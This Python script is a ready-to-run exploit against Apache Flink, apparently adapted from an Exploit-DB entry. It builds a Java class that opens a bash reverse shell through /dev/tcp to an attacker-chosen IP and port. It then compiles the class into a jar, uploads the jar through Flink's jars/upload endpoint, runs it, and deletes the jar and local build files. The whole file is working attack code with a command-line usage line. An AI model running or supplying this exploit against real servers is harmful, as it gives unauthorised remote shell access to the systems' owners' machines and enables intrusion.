import os
import sys
import requests

# Inspired from https://www.exploit-db.com/exploits/48978
class FlinkReverseShell:

    def __init__(self, url):
        self.url = url
        self.timeout = 10


    def jar_upload(self, local_ip, local_port):
        url = '%s/%s' % (self.url, 'jars/upload')

        with open('App.java', 'w') as f:
            f.write('''
                public class App {

                    public static void main(String[] args) throws Exception {
                        Process p;
                        try {
                            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/%s/%s 0>&1");
                            p.waitFor();
                            p.destroy();
                        } catch (Exception e) {}
                    }
                }''' % (local_ip, local_port))

        with open('manifest.mf', 'w') as f:
            f.write('Manifest-Version: 1.0\nMain-Class: App\n')

        os.system('javac App.java -source 11 -target 11')
        os.system('jar cfm exploit.jar manifest.mf App.class')

        with open('exploit.jar', 'rb') as f:
            files = {'jarfile': ('exploit.jar', f.read(), 'application/octet-stream')}

        res = requests.post(url, files=files, timeout=self.timeout, verify=False)
        os.system('rm App.java manifest.mf App.class exploit.jar')

        file_id = res.json()['filename'].split('/')[-1]
        return file_id


    def reverse_shell(self, local_ip, local_port):
        file_id = self.jar_upload(local_ip, local_port)

        requests.post(
            url=f'{self.url}/jars/{file_id}/run',
            timeout=self.timeout,
            verify=False
        )

        requests.delete(
            url=f'{self.url}/jars/{file_id}',
            timeout=self.timeout,
            verify=False
        )


if __name__ == '__main__':
    usage = 'python3 script.py flink_ip flink_port local_ip local_port'
    if len(sys.argv) != 5:
        print('simple usage: %s' % usage)
    else:
        flink_ip = sys.argv[1]
        flink_port = sys.argv[2]
        local_ip = sys.argv[3]
        local_port = sys.argv[4]
        url = 'http://%s:%s' % (flink_ip, flink_port)
        FlinkReverseShell(url).reverse_shell(local_ip, local_port)
